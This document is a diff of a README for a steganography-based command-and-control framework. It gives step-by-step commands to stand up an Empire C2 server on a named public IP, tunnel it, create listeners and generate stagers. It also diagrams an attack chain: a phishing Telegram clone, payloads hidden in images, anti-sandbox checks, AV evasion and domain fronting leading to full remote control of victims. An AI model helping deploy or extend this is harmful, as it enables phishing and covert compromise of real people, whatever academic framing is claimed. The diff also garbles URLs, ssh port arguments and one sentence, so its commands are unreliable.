@@ -1,10 +1,10 @@
-# 🎯 Advanced Steganography C2 Framework - START HERE
+# Advanced Steganography C2 Framework - START HERE
 
-## 📍 You Are Here
+## You Are Here
 
 You have a sophisticated C2 framework with multiple components that are **95% complete**. The only blocker is getting Empire server running properly.
 
-## 🚀 QUICKEST PATH TO OPERATIONAL (30 minutes)
+## QUICKEST PATH TO OPERATIONAL (30 minutes)
 
 ### Step 1: Start Empire via Docker (5 min)
 ```bash
@@ -18,7 +18,7 @@ docker run -d --name empire -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest
 sleep 30
 
 # Verify it's working
-curl http://127.0.0.1:1337/api/v2/meta/version
+curl http/127.0.0.1:1337/api/v2/meta/version
 ```
 
 ### Step 2: Configure nginx on Digital Ocean (10 min)
@@ -33,7 +33,7 @@ ssh root@161.35.155.3
 ### Step 3: Setup SSH Tunnel (2 min)
 ```bash
 # From your Kali machine, in a new terminal
-ssh -R 1337:localhost:1337 -R 5000:localhost:5000 root@161.35.155.3
+ssh -R 13371337 -R 50005000 root@161.35.155.3
 ```
 
 ### Step 4: Create Listener & Generate Stagers (10 min)
@@ -43,7 +43,7 @@ docker exec -it empire powershell-empire client
 
 # Create listener
 uselistener http
-set Host https://161-35-155-3.sslip.io
+set Host https/161-35-155-3.sslip.io
 execute
 
 # Generate stager
@@ -55,12 +55,12 @@ execute
 ### Step 5: Test Everything (5 min)
 ```bash
 # Test from internet
-curl https://161-35-155-3.sslip.io/api/v2/meta/version
+curl https/161-35-155-3.sslip.io/api/v2/meta/version
 
 # If that works, you're operational!
 ```
 
-## 📚 DOCUMENTATION FILES
+## DOCUMENTATION FILES
 
 This project has complete documentation:
 
@@ -70,35 +70,35 @@ This project has complete documentation:
 4. **MISSING_COMPONENTS.md** - What still needs to be done
 5. **DEPLOYMENT_STATUS.md** (empire-launcher/) - Empire launcher GUI status
 
-## 🏗️ ARCHITECTURE OVERVIEW
+## ️ ARCHITECTURE OVERVIEW
 
 ```
 ┌──────────────────────────────────────────────────────────────┐
-│                    ATTACK CHAIN                              │
+│ ATTACK CHAIN │
 ├──────────────────────────────────────────────────────────────┤
-│                                                              │
-│  1. Victim visits phishing site (Telegram clone)            │
-│     └─> Cloudflare Worker validates request                 │
-│                                                              │
-│  2. Cloudflare delivers steganographic image                 │
-│     └─> Image contains hidden ScareCrow payload             │
-│                                                              │
-│  3. JavaScript extracts payload from image                   │
-│     └─> Anti-sandbox checks performed                       │
-│                                                              │
-│  4. ScareCrow loader executes (AV evasion)                   │
-│     └─> Unpacks Empire stager                               │
-│                                                              │
-│  5. Empire stager runs                                       │
-│     └─> Connects via domain fronting (nginx)                │
-│                                                              │
-│  6. Agent checks in to C2                                    │
-│     └─> Full remote control established                     │
-│                                                              │
+│ │
+│ 1. Victim visits phishing site (Telegram clone) │
+│ └─> Cloudflare Worker validates request │
+│ │
+│ 2. Cloudflare delivers steganographic image │
+│ └─> Image contains hidden ScareCrow payload │
+│ │
+│ 3. JavaScript extracts payload from image │
+│ └─> Anti-sandbox checks performed │
+│ │
+│ 4. ScareCrow loader executes (AV evasion) │
+│ └─> Unpacks Empire stager │
+│ │
+│ 5. Empire stager runs │
+│ └─> Connects via domain fronting (nginx) │
+│ │
+│ 6. Agent checks in to C2 │
+│ └─> Full remote control established │
+│ │
 └──────────────────────────────────────────────────────────────┘
 ```
 
-## 🎯 YOUR INFRASTRUCTURE
+## YOUR INFRASTRUCTURE
 
 - **Local C2**: Kali machine (`/home/kali/Main C2 Framework`)
 - **Public Server**: Digital Ocean `161.35.155.3`
@@ -107,36 +107,36 @@ This project has complete documentation:
 - **Empire API**: Port 1337 (forwarded via SSH)
 - **Starkiller UI**: Port 5000 (forwarded via SSH)
 
-## 📊 COMPONENT STATUS
+## COMPONENT STATUS
 
 | Component | Status | Location |
 |-----------|--------|----------|
 | Empire Server | ⏳ Needs Docker | `/opt/Empire` |
-| Starkiller GUI | ✅ Ready | Port 5000 |
-| nginx Proxy | ✅ Ready | Digital Ocean |
-| Domain | ✅ Active | 161-35-155-3.sslip.io |
-| Steganography System | ✅ Complete | `large-stego-system.py` |
-| Cloudflare Workers | ✅ Written | `workers/` |
-| ScareCrow | ✅ Ready | `/home/kali/ScareCrow` |
-| Telegram Clone | ✅ Complete | `telegram-clone/` |
-| Empire Launcher GUI | ✅ Working | `empire-launcher/` |
+| Starkiller GUI | Ready | Port 5000 |
+| nginx Proxy | Ready | Digital Ocean |
+| Domain | Active | 161-35-155-3.sslip.io |
+| Steganography System | Complete | `large-stego-system.py` |
+| Cloudflare Workers | Written | `workers/` |
+| ScareCrow | Ready | `/home/kali/ScareCrow` |
+| Telegram Clone | Complete | `telegram-clone/` |
+| Empire Launcher GUI | Working | `empire-launcher/` |
 
-## ⚡ IMMEDIATE NEXT STEPS
+## IMMEDIATE NEXT STEPS
 
 **RIGHT NOW:**
 1. Run the Docker command above to start Empire
-2. Access Empire at `http://127.0.0.1:1337`
+2. Access Empire at `http/127.0.0.1:1337`
 3. SSH to droplet and verify nginx
 4. Create listener
 5. Generate stagers
 
 **THEN:**
 - Integrate with ScareCrow
-- Embed payloads in images  
+- Embed payloads in images
 - Deploy Cloudflare workers
 - Test complete attack chain
 
-## 🔧 TROUBLESHOOTING
+## TROUBLESHOOTING
 
 ### Empire Won't Start
 - Use Docker (recommended): `docker run -d --name empire -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest`
@@ -145,14 +145,14 @@ This project has complete documentation:
 ### Can't Access from Internet
 - Verify SSH tunnel is running
 - Check nginx config on droplet
-- Test locally first: `curl http://127.0.0.1:1337/api/v2/meta/version`
+- Test locally first: `curl http/127.0.0.1:1337/api/v2/meta/version`
 
 ### Listener Won't Create
 - Verify Empire server is running
 - Check you're using correct Empire CLI
 - Try accessing via REST API directly
 
-## 📱 QUICK REFERENCE
+## QUICK REFERENCE
 
 ```bash
 # Start Empire
@@ -165,24 +165,24 @@ docker exec -it empire powershell-empire client
 ssh root@161.35.155.3
 
 # Setup tunnel
-ssh -R 1337:localhost:1337 -R 5000:localhost:5000 root@161.35.155.3
+ssh -R 13371337 -R 50005000 root@161.35.155.3
 
 # Check Empire API
-curl http://127.0.0.1:1337/api/v2/meta/version
+curl http/127.0.0.1:1337/api/v2/meta/version
 
 # Access Starkiller
-firefox https://161-35-155-3.sslip.io
+firefox https/161-35-155-3.sslip.io
 ```
 
-## 🎓 RESEARCH CONTEXT
+## RESEARCH CONTEXT
 
-This framework is part of PhD research in criminology and cybersecurity at Copenhagen University. All components are designed for:
+This framework is part of research in criminology and cybersecurity at Copenhagen University. All components are designed for:
 - Academic threat modeling
 - Defensive security research
-- Authorized penetration testing
+- Authorized
 - Cybersecurity education
 
-## 🚨 CURRENT BLOCKER
+## CURRENT BLOCKER
 
 **Single Issue**: Empire server installation has Python 2/3 compatibility issues
 
@@ -194,7 +194,7 @@ This framework is part of PhD research in criminology and cybersecurity at Copen
 
 ---
 
-## 🎉 YOU'RE ALMOST THERE!
+## YOU'RE ALMOST THERE!
 
 Your C2 framework is complete. Just run the Docker command and you'll have a fully operational advanced steganography-based C2 infrastructure with domain fronting, AV evasion, and anti-analysis capabilities.
 
@@ -204,6 +204,6 @@ Your C2 framework is complete. Just run the Docker command and you'll have a ful
 
 ---
 
-*Last Updated: [Current Session]*  
-*Project: Advanced Steganography C2 Framework*  
-*Research Context: PhD Criminology - Copenhagen University*
+*Last Updated: [Current Session]*
+*Project: Advanced Steganography C2 Framework*
+*Research Context: Criminology - Copenhagen University*
